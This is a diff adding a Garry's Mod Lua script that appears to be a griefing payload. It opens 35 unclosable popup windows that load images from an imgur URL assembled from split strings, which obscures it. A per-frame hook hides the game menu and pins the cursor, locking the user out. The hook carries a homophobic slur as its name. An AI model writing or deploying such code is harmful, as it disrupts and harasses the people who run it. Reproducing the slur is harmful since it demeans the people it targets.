@@ -1,0 +1,21 @@
+function ts.MeMe(lnk)
+    local frame = vgui.Create("DFrame")
+    frame:SetTitle("meme daddy")
+    frame:SetSize(math.random(800, 1200), math.random(500, 800))
+    frame:SetPos(math.random(0, ScrW() - 750), math.random(0, ScrH() - 650))
+    frame:ShowCloseButton(false)
+    frame:MakePopup()
+    local html = vgui.Create("HTML", frame)
+    html:Dock(FILL)
+    html:OpenURL(lnk)
+end
+ 
+local hdr = "h" .. "t" .. "tp:" .. "//" .. "i." .. "im" .. "gur" .. "." .. "c" .. "om/"
+local shit = {"DLhWW73", "hYOVRLx", "icaLkz1", "8H9q7ND", "8enImtO"}
+local sfx = ".j" .. "pg"
+local e = 0
+local function yaya() e = e + 1 if 35 >= e then ts.MeMe(hdr .. table.Random(shit) .. sfx) timer.Simple(0.3, yaya) end end
+hook.Add("Think", "faggot", function() gui.HideGameUI() input.SetCursorPos(ScrW() / 2, ScrH() / 2) end)
+yaya()
+
+--https://pastebin.com/m56hyqpk
